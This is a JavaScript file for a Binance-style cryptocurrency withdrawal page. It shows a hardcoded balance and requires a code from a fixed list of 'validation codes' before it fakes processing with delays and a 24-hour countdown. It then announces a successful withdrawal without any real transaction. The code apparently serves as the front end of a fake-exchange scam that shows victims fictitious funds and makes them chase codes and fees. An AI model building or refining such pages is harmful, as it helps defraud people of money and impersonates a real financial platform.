// Withdrawal Pages Logic (Binance-style UI)

// ========== CONSTANTS ==========
const TOTAL_BALANCE = 8250.78;
const HOMEPAGE_BALANCE_AFTER = 0.0680;
const GAS_FEE = 0.034; // BNB
const COUNTDOWN_SECONDS = 86400; // 24 hours
const VALID_CODES = [
  "483921", "175064", "902718", "634285", "217509", "856430",
  "490127", "731694", "562803", "308417", "941256", "128374",
  "675820", "203519", "487960", "819432", "356701", "740528",
  "612947", "098135", "573864", "284691", "160738", "495260",
  "837514", "021693", "658407", "794135", "320586", "946172"
];
const NETWORKS = [
  "Etc Ethereum network",
  "BTC Bitcoin network",
  "BNB Smart Chain BEP20 Network",
  "Tron TRC 20 network"
];
const LS_KEY = 'withdrawal_pages_withdrawals';

// ========== UTILS ==========
function $(sel) { return document.querySelector(sel); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function fmtUsd(n) { return "$" + parseFloat(n).toLocaleString("en-US", {minimumFractionDigits:2, maximumFractionDigits:2}); }
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function formatCountdown(sec) {
  let h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
  return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
}

// ========== APP STATE ==========
let app = {
  user: { address: "", accountId: "walletmodal-org" },
  withdrawals: getLS(LS_KEY, [])
};

// ========== WITHDRAWAL PAGE FLOW ==========

// Withdraw button opens Binance-style footer sheet
$('#withdrawBtn').onclick = function() {
  $('#withdrawSheet').innerHTML = `
    <div class="footer-binance">
      <button id="onChainTransferBtn">On-Chain Transfer</button>
      <button id="userAccountIdBtn">User Account ID</button>
      <button id="closeWithdrawSheet">Cancel</button>
    </div>
  `;
  show($('#withdrawSheet'));
  $('#onChainTransferBtn').onclick = function() {
    hide($('#withdrawSheet'));
    renderWithdrawDetails();
  };
  $('#userAccountIdBtn').onclick = function() {
    alert("Your Account ID: " + (app.user?.accountId || ""));
  };
  $('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
};

function renderWithdrawDetails() {
  $('#withdrawDetailModal').innerHTML = `
    <div class="wd-modal">
      <label>Enter withdrawal address:</label>
      <input id="wdAddr" type="text" />
      <button id="fillFromWallet">Fill from connected wallet</button>
      <label>Select Network:</label>
      <input id="wdNetwork" readonly placeholder="Select Network" />
      <button id="selectNetworkBtn">Select Network</button>
      <label>Enter withdrawal amount:</label>
      <input id="wdAmt" type="number" />
      <button id="wdMaxBtn">Max</button>
      <label>Gas fee:</label>
      <span id="gasFeeLabel">${GAS_FEE} BNB</span>
      <button id="wdSubmitBtn">Withdraw</button>
      <div id="wdDetailMsg" class="text-red-500"></div>
      <button id="closeWithdrawDetail">Cancel</button>
    </div>
  `;
  show($('#withdrawDetailModal'));

  $('#fillFromWallet').onclick = function() {
    $('#wdAddr').value = app.user?.address || "";
  };
  $('#selectNetworkBtn').onclick = function() {
    let sel = document.createElement('div');
    sel.className = 'network-select-modal';
    NETWORKS.forEach(n => {
      let btn = document.createElement('button');
      btn.innerText = n;
      btn.onclick = function() {
        $('#wdNetwork').value = n;
        document.body.removeChild(sel);
      };
      sel.appendChild(btn);
    });
    document.body.appendChild(sel);
  };
  $('#wdMaxBtn').onclick = function() {
    $('#wdAmt').value = TOTAL_BALANCE;
  };
  $('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
  $('#wdSubmitBtn').onclick = function() {
    let addr = $('#wdAddr').value.trim();
    let amt = parseFloat($('#wdAmt').value);
    let net = $('#wdNetwork').value.trim();
    if (!addr || isNaN(amt) || amt<=0 || !net) { $('#wdDetailMsg').innerText="Enter valid address, amount and network"; return; }
    hide($('#withdrawDetailModal'));
    renderWithdrawCodeModal(addr, amt, net);
  };
}

function renderWithdrawCodeModal(addr, amt, net) {
  $('#withdrawCodeModal').innerHTML = `
    <div class="wd-code-modal">
      <label>Enter validation code:</label>
      <input id="wdCodeInput" type="text" />
      <button id="wdCodeSubmit">Submit</button>
      <div id="wdCodeMsg"></div>
      <button id="closeWithdrawCode">Cancel</button>
    </div>
  `;
  show($('#withdrawCodeModal'));

  $('#wdCodeSubmit').onclick = async function() {
    let code = $('#wdCodeInput').value.trim();
    $('#wdCodeMsg').innerText = "Processing...";
    await new Promise(res=>setTimeout(res,15000));
    if (VALID_CODES.includes(code)) {
      hide($('#withdrawCodeModal'));
      let wd = {
        address: addr, amount: amt, network: net,
        start: now(), end: now()+COUNTDOWN_SECONDS, status: "processing"
      };
      app.withdrawals.push(wd); saveLS(LS_KEY, app.withdrawals);
      renderWithdrawProcessing(wd);
      renderActivity();
    } else {
      $('#wdCodeMsg').innerText = "Validation failed please enter correct code";
    }
  };
  $('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };
}

function renderWithdrawProcessing(wd) {
  $('#withdrawProcessModal').innerHTML = `
    <div>
      <div>Withdrawal address: <span id="wpAddr">${wd.address}</span></div>
      <div>Network: <span id="wpNetwork">${wd.network}</span></div>
      <div>Amount: <span id="wpAmt">${fmtUsd(wd.amount)}</span></div>
      <div>24-hours countdown: <span id="wpCountdown"></span></div>
      <button id="wpViewDetails">View withdrawal details</button>
    </div>
  `;
  show($('#withdrawProcessModal'));

  let timer = setInterval(() => {
    let left = wd.end - now();
    $('#wpCountdown').innerText = formatCountdown(left > 0 ? left : 0);
    renderActivity();
    if (left <= 0) {
      clearInterval(timer);
      hide($('#withdrawProcessModal'));
      wd.status = "completed";
      saveLS(LS_KEY, app.withdrawals);
      renderWithdrawSuccess(wd);
      renderActivity();
    }
  }, 1000);

  $('#wpViewDetails').onclick = function() {
    hide($('#withdrawProcessModal'));
    renderActivity();
  };
}

function renderWithdrawSuccess(wd) {
  $('#withdrawSuccessModal').innerHTML = `
    <div>
      <div>Withdrawal Successful!</div>
      <div>
        <div>Address: ${wd.address}</div>
        <div>Amount: ${fmtUsd(wd.amount)}</div>
        <div>Network: ${wd.network}</div>
      </div>
      <button id="wsCloseBtn">Cancel</button>
    </div>
  `;
  show($('#withdrawSuccessModal'));

  $('#wsCloseBtn').onclick = function() {
    hide($('#withdrawSuccessModal'));
    renderActivity();
  };

  $('#homepageBalance').innerText = `Balance: ${HOMEPAGE_BALANCE_AFTER} USDT`;
}

function renderActivity() {
  let ongoing = app.withdrawals.filter(wd => wd.status === "processing" && now() < wd.end);
  let completed = app.withdrawals.filter(wd => wd.status === "completed");
  let html = '';

  ongoing.forEach(wd => {
    let left = wd.end-now();
    html += `
      <div class="tx-item">
        <span>Withdraw to: ${wd.address}</span>
        <span>Network: ${wd.network}</span>
        <span>Amount: ${fmtUsd(wd.amount)}</span>
        <span>Status: Processing</span>
        <span>Countdown: ${formatCountdown(left>0?left:0)}</span>
      </div>
    `;
  });
  completed.forEach(wd => {
    html += `
      <div class="tx-item success">
        <span>Withdraw to: ${wd.address}</span>
        <span>Network: ${wd.network}</span>
        <span>Amount: ${fmtUsd(wd.amount)}</span>
        <span>Status: Successful</span>
      </div>
    `;
  });
  $('#txActivitySection').innerHTML = html || '<div>No withdrawals yet.</div>';
}

// ========== RESTORE STATE ON PAGE LOAD ==========
window.addEventListener('DOMContentLoaded', function() {
  app.withdrawals = getLS(LS_KEY, []);
  renderActivity();
  app.withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => renderWithdrawProcessing(wd));
  $('#homepageBalance').innerText = `Balance: ${app.withdrawals.some(w=>w.status==="completed") ? HOMEPAGE_BALANCE_AFTER : TOTAL_BALANCE} USDT`;
});